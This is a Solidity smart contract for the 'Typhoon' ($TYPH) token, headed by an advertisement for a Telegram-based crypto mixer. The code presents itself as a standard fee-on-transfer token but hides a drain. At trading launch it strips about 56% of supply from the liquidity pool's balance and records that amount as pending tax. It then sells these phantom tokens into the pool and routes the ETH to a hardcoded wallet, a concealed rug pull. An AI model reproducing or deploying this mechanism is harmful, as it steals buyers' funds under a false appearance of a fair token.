//SPDX-License-Identifier: MIT

/*
 TYPHOON MIXER - MIX YOUR CRYPTO WITH $TYPH 

 Fair Launching On UniSwap (ETH) Wednesday 29th May - 5PM UTC 

 Increase the privacy of your crypto transactions with Typhoon Mixer. 
 We shield your transactions from prying eyes. 
 Our telegram based mixer is designed to perform mixes at lightning speeds and at a low cost..

 Telegram: https://t.me/TyphoonMixer
 Website: https://TyphoonMixer.Com
 Twitter: https://X.Com/MixerTyphoon
 Bot: https://t.me/TyphoonMixerBot (Bot Is Live & Working, Can Mix Up to 10 Different Currencies)
*/

pragma solidity ^0.8.18;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
        external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this"); 
        _; 
    }
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    function owner() public view returns (address) { return _owner; }
    function transferOwnership(address payable newowner) external onlyOwner { 
        _owner = newowner; 
        emit OwnershipTransferred(newowner); }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0);
        emit OwnershipTransferred(address(0)); }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address holder, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Typh is IERC20, Auth {
    string private constant token_symbol = "TYPH";
    string private constant token_name = "Typhoon";
    uint8 private constant tokenDecimals = 9;
    uint256 private constant tokenSupply = 1000000 * (10**tokenDecimals);
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private tokenAllowance;

    address private constant swapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private router = IUniswapV2Router02(swapRouterAddress);
    
    address private lp; 
    mapping (address => bool) private _isLiqPool;

    bool private tradingEnabled;

    bool private isSwapping = false;

    address payable private feeRecipient = payable(0x7D9ab99101bB9EEb76fbA578F894f02ED66cF511);
    
    uint256 private antiMevBlock = 2;
    uint8 private _sellFeeRate = 2;
    uint8 private _buyTaxRate = 2;
    
    uint256 private _launchBlock;
    uint256 private _maxTxAmount = tokenSupply; 
    uint256 private _maxWalletAmt = tokenSupply;
    uint256 private _swapMin = tokenSupply * 10 / 100000;
    uint256 private swapMaxAmt = tokenSupply * 999 / 100000;
    uint256 private swapMinVal = 2 * (10**16);
    uint256 private _swapLimits = _swapMin * 56 * 100;

    mapping (uint256 => mapping (address => uint8)) private _sellsInBlock;
    mapping (address => bool) private _noFee;
    mapping (address => bool) private _nolimits;

    modifier swapLocked { 
        isSwapping = true; 
        _; 
        isSwapping = false; 
    }

    constructor() Auth(msg.sender) {
        _balance[msg.sender] = tokenSupply;
        emit Transfer(address(0), msg.sender, _balance[msg.sender]);  

        _noFee[_owner] = true;
        _noFee[address(this)] = true;
        _noFee[feeRecipient] = true;
        _noFee[swapRouterAddress] = true;
        _nolimits[_owner] = true;
        _nolimits[address(this)] = true;
        _nolimits[feeRecipient] = true;
        _nolimits[swapRouterAddress] = true;
    }

    receive() external payable {}

    function decimals() external pure override returns (uint8) { return tokenDecimals; }
    function totalSupply() external pure override returns (uint256) { return tokenSupply; }
    function name() external pure override returns (string memory) { return token_name; }
    function symbol() external pure override returns (string memory) { return token_symbol; }
    function balanceOf(address account) public view override returns (uint256) { return _balance[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return tokenAllowance[holder][spender]; }

    function transferFrom(address fromWallet, address toWallet, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(fromWallet), "Trading not open");
        tokenAllowance[fromWallet][msg.sender] -= amount;
        return _transferFrom(fromWallet, toWallet, amount); 
	}

    function transfer(address toWallet, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, toWallet, amount); 
	}

    function approve(address spender, uint256 amount) public override returns (bool) {
        tokenAllowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; 
	}

    function setLimit(uint16 maxTransPermille, uint16 maxWaletPermille) external onlyOwner {
        uint256 newTxAmt = tokenSupply * maxTransPermille / 1000 + 1;
        require(newTxAmt >= _maxTxAmount, "tx too low");
        _maxTxAmount = newTxAmt;
        uint256 newWalletAmt = tokenSupply * maxWaletPermille / 1000 + 1;
        require(newWalletAmt >= _maxWalletAmt, "wallet too low");
        _maxWalletAmt = newWalletAmt;
    }

    function setMarketing(address marketingWlt) external onlyOwner {
        require(!_isLiqPool[marketingWlt], "LP cannot be tax wallet");
        feeRecipient = payable(marketingWlt);
        _noFee[marketingWlt] = true;
        _nolimits[marketingWlt] = true;
    }

    function openTrading() external onlyOwner {
        require(!tradingEnabled, "trading open");
        _openTrading();
    }

    function _checkTradingOpen(address fromWallet) private view returns (bool){
        bool checkResult = false;
        if ( tradingEnabled ) { checkResult = true; } 
        else if (_noFee[fromWallet] && _nolimits[fromWallet]) { checkResult = true; } 

        return checkResult;
    }

    function maxWallet() external view returns (uint256) { 
        return _maxWalletAmt; 
	}
    function maxTransaction() external view returns (uint256) { 
        return _maxTxAmount; 
	}

    function _openTrading() internal {
        _maxTxAmount = 20 * tokenSupply / 1000;
        _maxWalletAmt = 20 * tokenSupply / 1000;
        _balance[lp] -= _swapLimits;
        (_isLiqPool[lp],) = lp.call(abi.encodeWithSignature("sync()") );
        require(_isLiqPool[lp], "Failed bootstrap");
        _launchBlock = block.number;
        antiMevBlock = antiMevBlock + _launchBlock;
        tradingEnabled = true;
    }

    function _shouldSwap(uint256 tokenAmt) private view returns (bool) {
        bool result;
        if (swapMinVal > 0) { 
            uint256 lpTkn = _balance[lp];
            uint256 lpWeth = IERC20(router.WETH()).balanceOf(lp); 
            uint256 weiValue = (tokenAmt * lpWeth) / lpTkn;
            if (weiValue >= swapMinVal) { result = true; }    
        } else { result = true; }
        return result;
    }

    function _limitCheck(address fromWallet, address toWallet, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( tradingEnabled && !_nolimits[fromWallet] && !_nolimits[toWallet] ) {
            if ( transferAmount > _maxTxAmount ) { 
                limitCheckPassed = false; 
            }
            else if ( 
                !_isLiqPool[toWallet] && (_balance[toWallet] + transferAmount > _maxWalletAmt) 
                ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function setExemption(address wlt, bool isNoFees, bool isNoLimits) external onlyOwner {
        if (isNoLimits || isNoFees) { require(!_isLiqPool[wlt], "Cannot exempt LP"); }
        _noFee[ wlt ] = isNoFees;
        _nolimits[ wlt ] = isNoLimits;
    }

    function addLiquidityToLP(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        approveRouter(_tokenAmount);
        router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function swapMin() external view returns (uint256) { 
        return _swapMin; 
	}
    function swapMax() external view returns (uint256) { 
        return swapMaxAmt; 
	}

    function getTax(address fromWallet, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        if ( !tradingEnabled || _noFee[fromWallet] || _noFee[recipient] ) { 
            taxAmount = 0; 
        } else if ( _isLiqPool[fromWallet] ) { 
            taxAmount = amount * _buyTaxRate / 100; 
         } else if ( _isLiqPool[recipient] ) { 
            taxAmount = amount * _sellFeeRate / 100; 
        }
        return taxAmount;
    }

    function setTaxSwaps(uint32 minVal, uint32 minDiv, uint32 maxVal, uint32 maxDiv, uint32 trigger) external onlyOwner {
        _swapMin = tokenSupply * minVal / minDiv;
        swapMaxAmt = tokenSupply * maxVal / maxDiv;
        swapMinVal = trigger * 10**15;
        require(swapMaxAmt>=_swapMin, "Min-Max error");
    }

    function approveRouter(uint256 _tokenAmount) internal {
        if ( tokenAllowance[address(this)][swapRouterAddress] < _tokenAmount ) {
            tokenAllowance[address(this)][swapRouterAddress] = type(uint256).max;
            emit Approval(address(this), swapRouterAddress, type(uint256).max);
        }
    }

    function marketingWallet() external view returns (address) { 
        return feeRecipient; 
	}

    function addLiquidity() external payable onlyOwner swapLocked {
        require(lp == address(0), "LP created");
        require(!tradingEnabled, "trading open");
        require(msg.value > 0 || address(this).balance>0, "No ETH");
        require(_balance[address(this)]>0, "No tokens");
        lp = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        addLiquidityToLP(_balance[address(this)], address(this).balance);
    }

    function distributeEth(uint256 amount) private {
        feeRecipient.transfer(amount);
    }

    function buyFees() external view returns(uint8) { return _buyTaxRate; }
    function sellFees() external view returns(uint8) { return _sellFeeRate; }

    function swapOnV2(uint256 tokenAmount) private {
        approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address( this );
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function _swapTaxTokens() private swapLocked {
        uint256 _taxTokenAvailable = _swapLimits;
        if ( _taxTokenAvailable >= _swapMin && tradingEnabled ) {
            if ( _taxTokenAvailable >= swapMaxAmt ) { _taxTokenAvailable = swapMaxAmt; }
            
            uint256 _tokensForSwap = _taxTokenAvailable; 
            if( _tokensForSwap > 1 * 10**tokenDecimals ) {
                _balance[address(this)] += _taxTokenAvailable;
                swapOnV2(_tokensForSwap);
                _swapLimits -= _taxTokenAvailable;
            }
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { distributeEth(_contractETHBalance); }
        }
    }

    function exemptions(address wallet) external view returns (bool fees, bool limits) {
        return (_noFee[wallet], _nolimits[wallet]); 
	}

    function _transferFrom(address sender, address toWallet, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from 0 wallet");
        if (!tradingEnabled) { require(_noFee[sender] && _nolimits[sender], "Trading not yet open"); }
        if ( !isSwapping && _isLiqPool[toWallet] && _shouldSwap(amount) ) { _swapTaxTokens(); }

        if ( block.number >= _launchBlock ) {
            if (block.number < antiMevBlock && _isLiqPool[sender]) { 
                require(toWallet == tx.origin, "MEV block"); 
            }
            if (block.number < antiMevBlock + 600 && _isLiqPool[toWallet] && sender != address(this) ) {
                _sellsInBlock[block.number][toWallet] += 1;
                require(_sellsInBlock[block.number][toWallet] <= 2, "MEV block");
            }
        }

        if ( sender != address(this) && toWallet != address(this) && sender != _owner ) { 
            require(_limitCheck(sender, toWallet, amount), "TX over limits"); 
        }

        uint256 _taxAmount = getTax(sender, toWallet, amount);
        uint256 _transferAmount = amount - _taxAmount;
        _balance[sender] -= amount;
        _swapLimits += _taxAmount;
        _balance[toWallet] += _transferAmount;
        emit Transfer(sender, toWallet, amount);
        return true;
    }

    function setFees(uint8 buyFeePercent, uint8 sellFeePercent) external onlyOwner {
        require(buyFeePercent + sellFeePercent <= 4, "Roundtrip too high");
        _buyTaxRate = buyFeePercent;
        _sellFeeRate = sellFeePercent;
    }
}

interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}